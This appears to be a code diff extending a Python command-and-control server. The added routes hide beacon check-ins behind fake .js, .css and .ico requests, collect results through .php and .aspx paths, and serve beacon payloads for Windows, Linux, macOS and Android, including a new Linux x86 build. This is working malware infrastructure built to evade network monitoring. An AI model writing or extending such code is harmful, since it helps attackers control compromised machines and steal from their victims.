@@ -174,6 +174,7 @@ async def handle_payload(request: web.Request) -> web.Response:
         platform_map = {
             "/api/v1/payload": "beacon.exe",
             "/api/v1/payload_linux": "beacon_linux",
+            "/api/v1/payload_linux_x86": "beacon_linux_x86",
             "/api/v1/payload_macos": "beacon_macos",
             "/api/v1/payload_android": "beacon_android",
         }
@@ -223,9 +224,38 @@ class C2Server:
         self.loop: Optional[asyncio.AbstractEventLoop] = None
         self.thread: Optional[threading.Thread] = None
 
+    def _setup_app(self) -> web.Application:
+        app = web.Application()
+        # Check-in: Support malleable URIs
+        app.router.add_get("/api/v1/ping", handle_checkin)
+        app.router.add_post("/api/v1/ping", handle_checkin)
+        app.router.add_get("/{path:.*\.js}", handle_checkin)
+        app.router.add_post("/{path:.*\.js}", handle_checkin)
+        app.router.add_get("/{path:.*\.css}", handle_checkin)
+        app.router.add_post("/{path:.*\.css}", handle_checkin)
+        app.router.add_get("/{path:.*\.ico}", handle_checkin)
+        app.router.add_post("/{path:.*\.ico}", handle_checkin)
+        
+        # Results
+        app.router.add_post("/api/v1/result", handle_result)
+        app.router.add_post("/{path:.*\.php}", handle_result)
+        app.router.add_post("/{path:.*\.aspx}", handle_result)
+        
+        # Payload delivery
+        app.router.add_get("/api/v1/payload", handle_payload)
+        app.router.add_get("/api/v1/payload_linux", handle_payload)
+        app.router.add_get("/api/v1/payload_linux_x86", handle_payload)
+        app.router.add_get("/api/v1/payload_macos", handle_payload)
+        app.router.add_get("/api/v1/payload_android", handle_payload)
+        return app
+
     def _start_server(self) -> None:
         self.loop = asyncio.new_event_loop()
         asyncio.set_event_loop(self.loop)
+        
+        # Re-create app inside the loop thread
+        self.app = self._setup_app()
+        
         self.runner = web.AppRunner(self.app, access_log=None)
         self.loop.run_until_complete(self.runner.setup())
         self.site = web.TCPSite(self.runner, self.host, self.port)
